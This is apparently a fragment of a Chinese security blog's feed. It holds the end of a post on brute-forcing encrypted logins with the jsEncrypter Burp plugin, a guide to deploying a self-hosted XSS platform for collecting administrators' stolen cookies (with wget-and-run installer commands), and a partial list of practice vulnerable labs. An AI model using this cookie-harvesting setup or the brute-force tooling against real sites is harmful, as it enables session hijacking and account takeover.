href="#3-4-1-运行靶机" class="headerlink" title="3.4.1 运行靶机"></a>3.4.1 运行靶机</h3><p>项目提供了一个用php编写的靶机（jsEncrypter/server）,靶机提供了7个算法对密码进行加密后传输，后台解密，最后进行密码匹配。</p><ul><li>base64</li><li>md5</li><li>sha1</li><li>sha254</li><li>sha384</li><li>sha512</li><li>RSA</li></ul><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175724.png" class="lozad"></p><h3 id="3-4-2-编写phantomJS运行脚本"><a href="#3-4-2-编写phantomJS运行脚本" class="headerlink" title="3.4.2 编写phantomJS运行脚本"></a>3.4.2 编写phantomJS运行脚本</h3><p><code>jsEncrypter/js/jsEncrypter_base.js</code>为插件phantomJS脚本模板。我们只需要将实现加密算法的js文件引入模板脚本，并在模板脚本的js_encrypt函数体中完成对加密函数的调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">// 加载实现加密算法的js脚本</span><br><span class="line">var wasSuccessful = phantom.injectJs(&apos;xxx.js&apos;);/*引入实现加密的js文件*/</span><br><span class="line"> </span><br><span class="line">// 处理函数</span><br><span class="line">function js_encrypt(payload)&#123;</span><br><span class="line"> var newpayload;</span><br><span class="line"> /**********在这里编写调用加密函数进行加密的代码************/</span><br><span class="line">  /**********************************************************/</span><br><span class="line"> return newpayload;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>项目jsEncrypter/server/TestScript目录下是编写好的对应靶机各个加密算法的phantomJS脚本，可以参考！</p><h3 id="3-4-3-运行phantomJS并测试"><a href="#3-4-3-运行phantomJS并测试" class="headerlink" title="3.4.3 运行phantomJS并测试"></a>3.4.3 运行phantomJS并测试</h3><p>运行phantomJS</p><p>测试的目的是为了确保我们编写的phantomJS脚本能够正常加密payload。</p><p><img alt data-src="https://github.com/c0ny1/jsEncrypter/raw/master/doc/test.gif" class="lozad"></p><h3 id="抓包暴力破解"><a href="#抓包暴力破解" class="headerlink" title="抓包暴力破解"></a>抓包暴力破解</h3><p><img alt="img" data-src="https://github.com/c0ny1/jsEncrypter/raw/master/doc/crack.gif" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.uedbox.com/post/59166/" target="_blank" rel="noopener">https://www.uedbox.com/post/59166/</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="burpsuite" scheme="https://www.mad-coding.cn/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>XSS平台的搭建</title>
    <link href="https://www.mad-coding.cn/2019/09/29/XSS%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://www.mad-coding.cn/2019/09/29/XSS平台的搭建/</id>
    <published>2019-09-28T16:12:53.000Z</published>
    <updated>2019-10-11T08:38:54.551Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    XSS——跨站脚本攻击，是一个主流的web安全漏洞，主要分为反射型、存储型和DOM型。攻击者可以利用XSS漏洞获取管理员的cookie信息，然后使用该cookie信息登陆到系统后台，从而进一步攻破系统。而打管理员cookie信息的平台就叫XSS平台，晚上也有很多搭建好的，虽然也能注册使用，但是你打到的cookie别人也能看到，这样的话，总感觉不安全，所以就自己搭建了一个平台自己使用，哈哈哈。</p><a id="more"></a><h1 id="0x01-环境需求"><a href="#0x01-环境需求" class="headerlink" title="0x01 环境需求"></a>0x01 环境需求</h1><blockquote><p>vps：1G 512M即可 <a href="[https://billing.virmach.com](https://billing.virmach.com/)">传送门</a></p><p>域名：<a href="https://dnspod.cloud.tencent.com/" target="_blank" rel="noopener">腾讯云</a>  <a href="https://wanwang.aliyun.com/" target="_blank" rel="noopener">阿里云</a></p><p>宝塔面板</p><p>PHP 7版本</p><p>XSS平台源码 </p></blockquote><h1 id="0x02-vps购买"><a href="#0x02-vps购买" class="headerlink" title="0x02 vps购买"></a>0x02 vps购买</h1><p>可参考<a href="[https://www.mad-coding.cn/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/#0x01-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87](https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/#0x01-环境准备)">https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/</a></p><h1 id="0x03-域名购买"><a href="#0x03-域名购买" class="headerlink" title="0x03 域名购买"></a>0x03 域名购买</h1><p>可参考[<a href="https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/">https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/</a></p><h1 id="0x04-宝塔面板的安装"><a href="#0x04-宝塔面板的安装" class="headerlink" title="0x04 宝塔面板的安装"></a>0x04 宝塔面板的安装</h1><p>大家根据自己的vps系统选择对应的安装脚本命令，一件之行安装，非常方便</p><p><strong>entos**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure><p><strong>Ubuntu/Deepin**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh</span><br></pre></td></tr></table></figure><p><strong>Debian**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><p><strong>Fedora**</strong>安装命令<strong>**:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><h2 id="LNMP环境的安装"><a href="#LNMP环境的安装" class="headerlink" title="LNMP环境的安装"></a>LNMP环境的安装</h2><p>输入你的vps IP:8888宝塔面板后台，然后会弹出让你选择安装LAMP环境还是LNMP环境，我使用的是LNMP环境，记住PHP版本需要使用7版本以上。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929003418.png" class="lozad"></p><h1 id="0x05-开始搭建"><a href="#0x05-开始搭建" class="headerlink" title="0x05 开始搭建"></a>0x05 开始搭建</h1><h2 id="5-1-新建站点"><a href="#5-1-新建站点" class="headerlink" title="5.1 新建站点"></a>5.1 新建站点</h2><p>首先需要在宝塔面板中新建一个站点叫<code>xss.你的域名.com</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929003833.png" class="lozad"></p><p>需要从GitHub中下载xss平台的源码<a href="https://github.com/78778443/xssplatform" target="_blank" rel="noopener">传送门</a>，下载好源码后，上传到<code>xss.你的域名.com</code>站点下，记住，需要将压缩包的内容解压到站点根目录下。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929004025.png" class="lozad"></p><h2 id="2-2设置伪静态"><a href="#2-2设置伪静态" class="headerlink" title="2.2设置伪静态"></a>2.2设置伪静态</h2><p>在网站-&gt;设置</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929004153.png" class="lozad"></p><p>在伪静态中添加相关带代码</p><p>【apache方式】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteBase /</span><br><span class="line">RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L]</span><br><span class="line">RewriteRule ^do/auth/(\w+?)(/domain/([\w\.]+?))?$  /index.php?do=do&amp;auth=$1&amp;domain=$3 [L]</span><br><span class="line">RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L]</span><br><span class="line">RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><p>【nginx方式】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)&quot; /index.php?do=code&amp;urlKey=1 last;</span><br><span class="line">rewrite &quot;^/do/auth/(\w+?)(/domain/([\w.]+?))?&quot; /index.php?do=do&amp;auth=1&amp;domain=3 last;</span><br><span class="line">rewrite &quot;^/register/(.*?)&quot; /index.php?do=register&amp;key=1 last;</span><br><span class="line">rewrite &quot;^/register-validate/(.*?)&quot; /index.php?do=register&amp;act=validate&amp;key=$1 last;</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929004245.png" class="lozad"></p><h2 id="2-2-设置域名解析"><a href="#2-2-设置域名解析" class="headerlink" title="2.2 设置域名解析"></a>2.2 设置域名解析</h2><p>添加域名解析，子域名设置为xss，记录为A ，记录值为VPS ip地址。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005237.png" class="lozad"></p><h2 id="2-4-设置数据库"><a href="#2-4-设置数据库" class="headerlink" title="2.4 设置数据库"></a>2.4 设置数据库</h2><p>宝塔面板中 ，数据库-&gt;添加数据库</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005501.png" class="lozad"></p><h2 id="2-5-开始安装"><a href="#2-5-开始安装" class="headerlink" title="2.5 开始安装"></a>2.5 开始安装</h2><p>输入域名开始安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005533.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005739.png" class="lozad"></p><p>然后点击下一步出现数据库导入成功就说明安装好了。</p><h1 id="0x06-使用"><a href="#0x06-使用" class="headerlink" title="0x06 使用"></a>0x06 使用</h1><p>输入域名访问</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929010153.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929010238.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;​    XSS——跨站脚本攻击，是一个主流的web安全漏洞，主要分为反射型、存储型和DOM型。攻击者可以利用XSS漏洞获取管理员的cookie信息，然后使用该cookie信息登陆到系统后台，从而进一步攻破系统。而打管理员cookie信息的平台就叫XSS平台，晚上也有很多搭建好的，虽然也能注册使用，但是你打到的cookie别人也能看到，这样的话，总感觉不安全，所以就自己搭建了一个平台自己使用，哈哈哈。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="XSS平台" scheme="https://www.mad-coding.cn/tags/XSS%E5%B9%B3%E5%8F%B0/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试实战靶场</title>
    <link href="https://www.mad-coding.cn/2019/09/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/"/>
    <id>https://www.mad-coding.cn/2019/09/26/渗透测试实战靶场/</id>
    <published>2019-09-26T01:00:46.000Z</published>
    <updated>2019-09-26T01:19:58.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在学习渗透测试的过程中，光学理论知识是不够的，还需要结合实战来进行学习。但是国家法律是不允许我们对互联网上的web站在未授权的情况下进行渗透测试的，所以我们只能通过自己搭建环境来进行学习。下面给大家分享一些靶场，免得大家再去寻找。</p><a id="more"></a><h1 id="0x01-Vulnerable-Web-Applications"><a href="#0x01-Vulnerable-Web-Applications" class="headerlink" title="0x01 Vulnerable Web Applications"></a>0x01 <strong>Vulnerable Web Applications</strong></h1><table><thead><tr><th>BadStore</th><th><a href="http://www.badstore.net/" target="_blank" rel="noopener">http://www.badstore.net/</a></th></tr></thead><tbody><tr><td>BodgeIt Store</td><td><a href="http://code.google.com/p/bodgeit/" target="_blank" rel="noopener">http://code.google.com/p/bodgeit/</a></td></tr><tr><td>Butterfly Security Project</td><td><a href="http://thebutterflytmp.sourceforge.net/" target="_blank" rel="noopener">http://thebutterflytmp.sourceforge.net/</a></td></tr><tr><td>bWAPP</td><td><a href="http://www.mmeit.be/bwapp/" target="_blank" rel="noopener">http://www.mmeit.be/bwapp/</a>  <a href="http://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">http://sourceforge.net/projects/bwapp/files/bee-box/</a></td></tr><tr><td>Commix</td><td><a href="https://github.com/stasinopoulos/commix-testbed" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix-testbed</a></td></tr><tr><td>CryptOMG</td><td><a href="https://github.com/SpiderLabs/CryptOMG" target="_blank" rel="noopener">https://github.com/SpiderLabs/CryptOMG</a></td></tr><tr><td>Damn Vulnerable Node Application (DVNA)</td><td><a href="https://github.com/quantumfoam/DVNA/" target="_blank" rel="noopener">https://github.com/quantumfoam/DVNA/</a></td></tr><tr><td>Damn Vulnerable Web App (DVWA)</td><td><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></td></tr><tr><td>Damn Vulnerable Web Services (DVWS)</td><td><a href="http://dvws.professionallyevil.com/" target="_blank" rel="noopener">http://dvws.professionallyevil.com/</a></td></tr><tr><td>Drunk Admin Web Hacking Challenge</td><td><a href="https://bechtsoudis.com/work-stuff/challenges/drunk-admin-web-hacking-challenge/" target="_blank" rel="noopener">https://bechtsoudis.com/work-stuff/challenges/drunk-admin-web-hacking-challenge/</a></td></tr><tr><td>Exploit KB Vulnerable Web App</td><td><a href="http://exploit.co.il/projects/vuln-web-app/" target="_blank" rel="noopener">http://exploit.co.il/projects/vuln-web-app/</a></td></tr><tr><td>Foundstone Hackme Bank</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-bank.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-bank.aspx</a></td></tr><tr><td>Foundstone Hackme Books</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmebooks.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmebooks.aspx</a></td></tr><tr><td>Foundstone Hackme Casino</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx</a></td></tr><tr><td>Foundstone Hackme Shipping</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmeshipping.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmeshipping.aspx</a></td></tr><tr><td>Foundstone Hackme Travel</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmetravel.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmetravel.aspx</a></td></tr><tr><td>GameOver</td><td><a href="http://sourceforge.net/projects/null-gameover/" target="_blank" rel="noopener">http://sourceforge.net/projects/null-gameover/</a></td></tr><tr><td>hackxor</td><td><a href="http://hackxor.sourceforge.net/cgi-bin/index.pl" target="_blank" rel="noopener">http://hackxor.sourceforge.net/cgi-bin/index.pl</a></td></tr><tr><td>Hackazon</td><td><a href="https://github.com/rapid7/hackazon" target="_blank" rel="noopener">https://github.com/rapid7/hackazon</a></td></tr><tr><td>LAMPSecurity</td><td><a href="http://sourceforge.net/projects/lampsecurity/" target="_blank" rel="noopener">http://sourceforge.net/projects/lampsecurity/</a></td></tr><tr><td>Moth</td><td><a href="http://www.bonsai-sec.com/en/research/moth.php" target="_blank" rel="noopener">http://www.bonsai-sec.com/en/research/moth.php</a></td></tr><tr><td>NOWASP / Mutillidae 2</td><td><a href="http://sourceforge.net/projects/mutillidae/" target="_blank" rel="noopener">http://sourceforge.net/projects/mutillidae/</a></td></tr><tr><td>OWASP BWA</td><td><a href="http://code.google.com/p/owaspbwa/" target="_blank" rel="noopener">http://code.google.com/p/owaspbwa/</a></td></tr><tr><td>OWASP Hackademic</td><td><a href="http://hackademic1.teilar.gr/" target="_blank" rel="noopener">http://hackademic1.teilar.gr/</a></td></tr><tr><td>OWASP SiteGenerator</td><td><a href="https://www.owasp.org/index.php/Owasp_SiteGenerator" target="_blank" rel="noopener">https://www.owasp.org/index.php/Owasp_SiteGenerator</a></td></tr><tr><td>OWASP Bricks</td><td><a href="http://sourceforge.net/projects/owaspbricks/" target="_blank" rel="noopener">http://sourceforge.net/projects/owaspbricks/</a></td></tr><tr><td>OWASP Security Shepherd</td><td><a href="https://www.owasp.org/index.php/OWASP_Security_Shepherd" target="_blank" rel="noopener">https://www.owasp.org/index.php/OWASP_Security_Shepherd</a></td></tr><tr><td>PentesterLab</td><td><a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a></td></tr><tr><td>PHDays iBank CTF</td><td><a href="http://blog.phdays.com/2012/05/once-again-about-remote-banking.html" target="_blank" rel="noopener">http://blog.phdays.com/2012/05/once-again-about-remote-banking.html</a></td></tr><tr><td>SecuriBench</td><td><a href="http://suif.stanford.edu/~livshits/securibench/" target="_blank" rel="noopener">http://suif.stanford.edu/~livshits/securibench/</a></td></tr><tr><td>SentinelTestbed</td><td><a href="https://github.com/dobin/SentinelTestbed" target="_blank" rel="noopener">https://github.com/dobin/SentinelTestbed</a></td></tr><tr><td>SocketToMe</td><td><a href="http://digi.ninja/projects/sockettome.php" target="_blank" rel="noopener">http://digi.ninja/projects/sockettome.php</a></td></tr><tr><td>sqli-labs</td><td><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></td></tr><tr><td>MCIR (Magical Code Injection Rainbow)</td><td><a href="https://github.com/SpiderLabs/MCIR" target="_blank" rel="noopener">https://github.com/SpiderLabs/MCIR</a></td></tr><tr><td>sqlilabs</td><td><a href="https://github.com/himadriganguly/sqlilabs" target="_blank" rel="noopener">https://github.com/himadriganguly/sqlilabs</a></td></tr><tr><td>VulnApp</td><td><a href="http://www.nth-dimension.org.uk/blog.php?id=88" target="_blank" rel="noopener">http://www.nth-dimension.org.uk/blog.php?id=88</a></td></tr><tr><td>PuzzleMall</td><td><a href="http://code.google.com/p/puzzlemall/" target="_blank" rel="noopener">http://code.google.com/p/puzzlemall/</a></td></tr><tr><td>WackoPicko</td><td><a href="https://github.com/adamdoupe/WackoPicko" target="_blank" rel="noopener">https://github.com/adamdoupe/WackoPicko</a></td></tr><tr><td>WAED</td><td><a href="http://www.waed.info/" target="_blank" rel="noopener">http://www.waed.info</a></td></tr><tr><td>WebGoat.NET</td><td><a href="https://github.com/jerryhoff/WebGoat.NET" target="_blank" rel="noopener">https://github.com/jerryhoff/WebGoat.NET/</a></td></tr><tr><td>WebSecurity Dojo</td><td><a href="http://www.mavensecurity.com/web_security_dojo/" target="_blank" rel="noopener">http://www.mavensecurity.com/web_security_dojo/</a></td></tr><tr><td>XVWA</td><td><a href="https://github.com/s4n7h0/xvwa" target="_blank" rel="noopener">https://github.com/s4n7h0/xvwa</a></td></tr><tr><td>Zap WAVE</td><td><a href="http://code.google.com/p/zaproxy/downloads/detail?name=zap-wave-0.1.zip" target="_blank" rel="noopener">http://code.google.com/p/zaproxy/downloads/detail?name=zap-wave-0.1.zip</a></td></tr></tbody></table><h1 id="0x02-Vulnerable-Operating-System-Installations"><a href="#0x02-Vulnerable-Operating-System-Installations" class="headerlink" title="0x02 Vulnerable Operating System Installations"></a>0x02 <strong>Vulnerable Operating System Installations</strong></h1><table><thead><tr><th>21LTR</th><th><a href="http://21ltr.com/scenes/" target="_blank" rel="noopener">http://21ltr.com/scenes/</a></th></tr></thead><tbody><tr><td>Damn Vulnerable Linux</td><td><a href="http://sourceforge.net/projects/virtualhacking/files/os/dvl/" target="_blank" rel="noopener">http://sourceforge.net/projects/virtualhacking/files/os/dvl/</a></td></tr><tr><td>exploit-exercises - nebula, protostar, fusion</td><td><a href="http://exploit-exercises.com/download" target="_blank" rel="noopener">http://exploit-exercises.com/download</a></td></tr><tr><td>heorot: DE-ICE, hackerdemia</td><td><a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S2.100.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S2.100.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.123.iso" target="_blank" rel="noopener">hackerdemia - http://hackingdojo.com/downloads/iso/De-ICE_S1.123.iso</a></td></tr><tr><td>Holynix</td><td><a href="http://sourceforge.net/projects/holynix/files/" target="_blank" rel="noopener">http://sourceforge.net/projects/holynix/files/</a></td></tr><tr><td>Kioptrix</td><td><a href="http://www.kioptrix.com/blog/" target="_blank" rel="noopener">http://www.kioptrix.com/blog/</a></td></tr><tr><td>LAMPSecurity</td><td><a href="http://sourceforge.net/projects/lampsecurity/" target="_blank" rel="noopener">http://sourceforge.net/projects/lampsecurity/</a></td></tr><tr><td>Metasploitable</td><td><a href="http://sourceforge.net/projects/virtualhacking/files/os/metasploitable/" target="_blank" rel="noopener">http://sourceforge.net/projects/virtualhacking/files/os/metasploitable/</a></td></tr><tr><td>neutronstar</td><td><a href="http://neutronstar.org/goatselinux.html" target="_blank" rel="noopener">http://neutronstar.org/goatselinux.html</a></td></tr><tr><td>PenTest Laboratory</td><td><a href="http://pentestlab.org/lab-in-a-box/" target="_blank" rel="noopener">http://pentestlab.org/lab-in-a-box/</a></td></tr><tr><td>Pentester Lab</td><td><a href="https://www.pentesterlab.com/exercises" target="_blank" rel="noopener">https://www.pentesterlab.com/exercises</a></td></tr><tr><td>pWnOS</td><td><a href="http://www.pwnos.com/" target="_blank" rel="noopener">http://www.pwnos.com/</a></td></tr><tr><td>RebootUser Vulnix</td><td><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></td></tr><tr><td>SecGame # 1: Sauron</td><td><a href="http://sg6-labs.blogspot.co.uk/2007/12/secgame-1-sauron.html" target="_blank" rel="noopener">http://sg6-labs.blogspot.co.uk/2007/12/secgame-1-sauron.html</a></td></tr><tr><td>scriptjunkie.us</td><td><a href="http://www.scriptjunkie.us/2012/04/the-hacker-games/" target="_blank" rel="noopener">http://www.scriptjunkie.us/2012/04/the-hacker-games/</a></td></tr><tr><td>UltimateLAMP</td><td><a href="http://www.amanhardikar.com/mindmaps/practice-links.html" target="_blank" rel="noopener">http://www.amanhardikar.com/mindmaps/practice-links.html</a></td></tr><tr><td>TurnKey Linux</td><td><a href="http://www.turnkeylinux.org/" target="_blank" rel="noopener">http://www.turnkeylinux.org/</a></td></tr><tr><td>Bitnami</td><td><a href="https://bitnami.com/stacks" target="_blank" rel="noopener">https://bitnami.com/stacks</a></td></tr><tr><td>Elastic Server</td><td><a href="http://elasticserver.com/" target="_blank" rel="noopener">http://elasticserver.com</a></td></tr><tr><td>OS Boxes</td><td><a href="http://www.osboxes.org/" target="_blank" rel="noopener">http://www.osboxes.org</a></td></tr><tr><td>VirtualBoxes</td><td><a href="http://virtualboxes.org/images/" target="_blank" rel="noopener">http://virtualboxes.org/images/</a></td></tr><tr><td>VirtualBox Virtual Appliances</td><td><a href="https://virtualboximages.com/" target="_blank" rel="noopener">https://virtualboximages.com/</a></td></tr><tr><td>CentOS</td><td><a href="http://www.centos.org/" target="_blank" rel="noopener">http://www.centos.org/</a></td></tr><tr><td>Default Windows Clients</td><td><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise" target="_blank" rel="noopener">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise</a>  <a href="https://dev.windows.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://dev.windows.com/en-us/microsoft-edge/tools/vms/</a></td></tr><tr><td>Default Windows Server</td><td><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-technical-preview" target="_blank" rel="noopener">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-technical-preview</a></td></tr><tr><td>Default VMWare vSphere</td><td><a href="http://www.vmware.com/products/vsphere/" target="_blank" rel="noopener">http://www.vmware.com/products/vsphere/</a></td></tr></tbody></table><h1 id="0x03-Sites-for-Downloading-Older-Versions-of-Various-Software"><a href="#0x03-Sites-for-Downloading-Older-Versions-of-Various-Software" class="headerlink" title="0x03 Sites for Downloading Older Versions of Various Software"></a>0x03 <strong>Sites for Downloading Older Versions of Various Software</strong></h1><table><thead><tr><th>Exploit-DB</th><th><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com/</a></th></tr></thead><tbody><tr><td>Old Apps</td><td><a href="http://www.oldapps.com/" target="_blank" rel="noopener">http://www.oldapps.com/</a></td></tr><tr><td>Old Version</td><td><a href="http://www.oldversion.com/" target="_blank" rel="noopener">http://www.oldversion.com/</a></td></tr><tr><td>VirtualHacking Repo</td><td><a href="https://www.amanhardikar.com/mindmaps/sourceforge.net/projects/virtualhacking/files/apps%40realworld/" target="_blank" rel="noopener">sourceforge.net/projects/virtualhacking/files/apps%40realworld/</a></td></tr></tbody></table><h1 id="0x04-Sites-by-Vendors-of-Security-Testing-Software"><a href="#0x04-Sites-by-Vendors-of-Security-Testing-Software" class="headerlink" title="0x04 Sites by Vendors of Security Testing Software"></a>0x04 <strong>Sites by Vendors of Security Testing Software</strong></h1><table><thead><tr><th>Acunetix acuforum</th><th><a href="http://testasp.vulnweb.com/" target="_blank" rel="noopener">http://testasp.vulnweb.com/</a></th></tr></thead><tbody><tr><td>Acunetix acublog</td><td><a href="http://testaspnet.vulnweb.com/" target="_blank" rel="noopener">http://testaspnet.vulnweb.com/</a></td></tr><tr><td>Acunetix acuart</td><td><a href="http://testphp.vulnweb.com/" target="_blank" rel="noopener">http://testphp.vulnweb.com/</a></td></tr><tr><td>Cenzic crackmebank</td><td><a href="http://crackme.cenzic.com/" target="_blank" rel="noopener">http://crackme.cenzic.com</a></td></tr><tr><td>HP freebank</td><td><a href="http://zero.webappsecurity.com/" target="_blank" rel="noopener">http://zero.webappsecurity.com</a></td></tr><tr><td>IBM altoromutual</td><td><a href="http://demo.testfire.net/" target="_blank" rel="noopener">http://demo.testfire.net/</a></td></tr><tr><td>Mavituna testsparker</td><td><a href="http://aspnet.testsparker.com/" target="_blank" rel="noopener">http://aspnet.testsparker.com</a></td></tr><tr><td>Mavituna testsparker</td><td><a href="http://php.testsparker.com/" target="_blank" rel="noopener">http://php.testsparker.com</a></td></tr><tr><td>NTOSpider Test Site</td><td><a href="http://www.webscantest.com/" target="_blank" rel="noopener">http://www.webscantest.com/</a></td></tr></tbody></table><h1 id="0x05-Sites-for-Improving-Your-Hacking-Skills"><a href="#0x05-Sites-for-Improving-Your-Hacking-Skills" class="headerlink" title="0x05 Sites for Improving Your Hacking Skills"></a>0x05 <strong>Sites for Improving Your Hacking Skills</strong></h1><table><thead><tr><th>Embedded Security CTF</th><th><a href="https://microcorruption.com/" target="_blank" rel="noopener">https://microcorruption.com</a></th></tr></thead><tbody><tr><td>EnigmaGroup</td><td><a href="http://www.enigmagroup.org/" target="_blank" 